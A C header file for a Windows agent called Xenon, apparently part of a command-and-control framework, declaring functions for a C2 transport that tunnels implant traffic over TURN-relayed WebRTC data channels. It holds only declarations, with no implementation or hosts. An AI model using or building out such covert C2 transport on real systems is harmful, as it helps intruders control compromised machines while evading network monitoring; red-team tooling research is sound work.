#pragma once
#include <windows.h>

#include "Xenon.h"
#include "Config.h"
#include "Parser.h"
#include "Package.h"

#ifdef TURNC2_TRANSPORT

/* Initialize TURN C2 transport (call once before first use) */
BOOL TurnInit(void);

/* Establish or re-establish the WebRTC data channel connection */
BOOL TurnEstablishWebRTC(void);

/* Tear down current connection and re-establish */
BOOL TurnReconnect(void);

/* Send package and receive response over WebRTC data channel (egress pattern) */
BOOL NetworkTurnSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen);

#endif // TURNC2_TRANSPORT
